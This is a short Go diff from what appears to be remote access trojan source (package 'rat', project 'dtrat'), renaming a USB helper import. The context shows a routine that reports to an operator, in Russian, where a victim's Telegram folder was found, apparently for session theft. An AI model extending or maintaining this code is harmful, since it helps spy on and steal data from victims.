@@ -2,7 +2,7 @@ package rat
 
 import (
 	"dtrat/config"
-	"dtrat/engine/system/usbwin"
+	"dtrat/engine/system/usb"
 	"dtrat/transport"
 	"fmt"
 	"os"
@@ -161,7 +161,7 @@ func (r *Rat) findTgCmd() {
 	r.Transport.Send("Папка Telegram найдена: %s", path)
 }
 
-func (r *Rat) usbDevicesListFmt(devices []usbwin.USBDevice) string {
+func (r *Rat) usbDevicesListFmt(devices []usb.USBDevice) string {
 	if len(devices) == 0 {
 		return "USB устройства не найдены."
 	}
